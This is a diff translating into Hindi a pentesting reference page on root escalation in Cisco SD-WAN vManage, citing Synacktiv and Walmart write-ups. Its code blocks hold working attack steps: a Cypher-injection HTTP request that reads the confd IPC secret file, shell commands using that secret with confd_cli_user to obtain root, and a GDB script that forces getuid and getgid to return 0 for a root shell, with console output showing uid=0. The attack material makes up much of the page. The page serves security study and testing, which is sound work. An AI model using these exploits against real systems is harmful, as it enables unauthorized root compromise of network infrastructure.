@@ -6,16 +6,13 @@
 
 (Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
-
+कुछ [दस्तावेज़ीकरण](http://66.218.245.39/doc/html/rn03re18.html) के माध्यम से थोड़ी खुदाई करने के बाद जो `confd` और विभिन्न बाइनरीज़ से संबंधित है (जो Cisco वेबसाइट पर एक खाते के साथ सुलभ हैं), हमने पाया कि IPC सॉकेट को प्रमाणित करने के लिए, यह `/etc/confd/confd_ipc_secret` में स्थित एक गुप्त का उपयोग करता है:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-
-Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
-
+क्या आपको हमारी Neo4j इंस्टेंस याद है? यह `vmanage` उपयोगकर्ता के विशेषाधिकारों के तहत चल रही है, जिससे हमें पिछले कमजोरियों का उपयोग करके फ़ाइल प्राप्त करने की अनुमति मिलती है:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -27,9 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-
-The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
-
+`confd_cli` प्रोग्राम कमांड लाइन तर्कों का समर्थन नहीं करता है लेकिन `/usr/bin/confd_cli_user` को तर्कों के साथ कॉल करता है। इसलिए, हम सीधे `/usr/bin/confd_cli_user` को अपने तर्कों के सेट के साथ कॉल कर सकते हैं। हालाँकि, यह हमारे वर्तमान विशेषाधिकारों के साथ पढ़ने योग्य नहीं है, इसलिए हमें इसे rootfs से प्राप्त करना होगा और इसे scp का उपयोग करके कॉपी करना होगा, मदद पढ़नी होगी, और इसे शेल प्राप्त करने के लिए उपयोग करना होगा:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -47,15 +42,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
 ## Path 2
 
 (Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
+synacktiv टीम द्वारा लिखे गए ब्लॉग¹ में एक रूट शेल प्राप्त करने का एक सुंदर तरीका बताया गया है, लेकिन समस्या यह है कि इसके लिए `/usr/bin/confd_cli_user` की एक प्रति प्राप्त करनी होती है, जो केवल रूट द्वारा पढ़ी जा सकती है। मैंने बिना किसी परेशानी के रूट तक पहुंचने का एक और तरीका पाया।
 
-When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
-
+जब मैंने `/usr/bin/confd_cli` बाइनरी को असेंबल किया, तो मैंने निम्नलिखित देखा:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -84,46 +77,40 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-
-When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
-
+जब मैंने "ps aux" चलाया, तो मैंने निम्नलिखित देखा (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
+मैंने अनुमान लगाया कि “confd_cli” प्रोग्राम लॉग इन किए गए उपयोगकर्ता से एकत्रित उपयोगकर्ता आईडी और समूह आईडी को “cmdptywrapper” एप्लिकेशन को पास करता है।
 
-I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+मेरा पहला प्रयास “cmdptywrapper” को सीधे चलाने का था और इसे `-g 0 -u 0` प्रदान करने का था, लेकिन यह विफल हो गया। ऐसा लगता है कि एक फ़ाइल डिस्क्रिप्टर (-i 1015) कहीं न कहीं बनाया गया था और मैं इसे नकली नहीं बना सकता।
 
-My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
+जैसा कि synacktiv के ब्लॉग में उल्लेख किया गया है (अंतिम उदाहरण), `confd_cli` प्रोग्राम कमांड लाइन तर्क का समर्थन नहीं करता है, लेकिन मैं इसे एक डिबगर के साथ प्रभावित कर सकता हूं और सौभाग्य से GDB सिस्टम पर शामिल है।
 
-As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
-
-I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+मैंने एक GDB स्क्रिप्ट बनाई जहां मैंने API `getuid` और `getgid` को 0 लौटाने के लिए मजबूर किया। चूंकि मेरे पास पहले से ही deserialization RCE के माध्यम से “vmanage” विशेषाधिकार है, मुझे सीधे `/etc/confd/confd_ipc_secret` पढ़ने की अनुमति है।
 
 root.gdb:
-
 ```
 set environment USER=root
 define root
-   finish
-   set $rax=0
-   continue
+finish
+set $rax=0
+continue
 end
 break getuid
 commands
-   root
+root
 end
 break getgid
 commands
-   root
+root
 end
 run
 ```
-
-Console Output:
-
+कंसोल आउटपुट:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -157,5 +144,4 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
